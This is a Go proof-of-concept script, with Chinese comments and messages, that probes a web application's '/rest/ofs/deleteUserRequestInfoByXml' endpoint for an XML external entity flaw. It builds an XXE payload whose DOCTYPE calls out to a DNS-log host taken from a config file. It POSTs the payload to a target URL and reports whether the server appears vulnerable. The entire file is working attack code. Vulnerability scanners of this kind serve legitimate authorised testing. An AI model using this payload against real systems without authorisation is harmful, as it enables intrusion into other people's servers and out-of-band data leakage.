package poc

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func DeleteUserRequestInfoByXml(url string) {

	// 指定config文件路径
	filePath := "config/config.txt"
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("无法打开文件:", err)
		return
	}
	defer file.Close()

	dnslog, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("无法读取文件内容:", err)
		return
	}

	data := "<?xml version=\"1.0\"?>\n<!DOCTYPE syscode SYSTEM \"http://" + string(dnslog) + "/2\"> \n<M>\n    <syscode>\n2\n    </syscode>\n</M>"

	client := http.Client{}
	req, err := http.NewRequest("POST", url+"/rest/ofs/deleteUserRequestInfoByXml", strings.NewReader(data))
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	reg1 := regexp.MustCompile("ResultInfo")
	msg1 := reg1.MatchString(string(body))
	reg2 := regexp.MustCompile("syscode")
	msg2 := reg2.MatchString(string(body))
	if msg1 && msg2 {
		log.Println("[+] 存在 deleteUserRequestInfoByXml 漏洞，请检查Dnslog回显")
	} else {
		log.Println("[-] 不存在 deleteUserRequestInfoByXml 漏洞")
	}

}
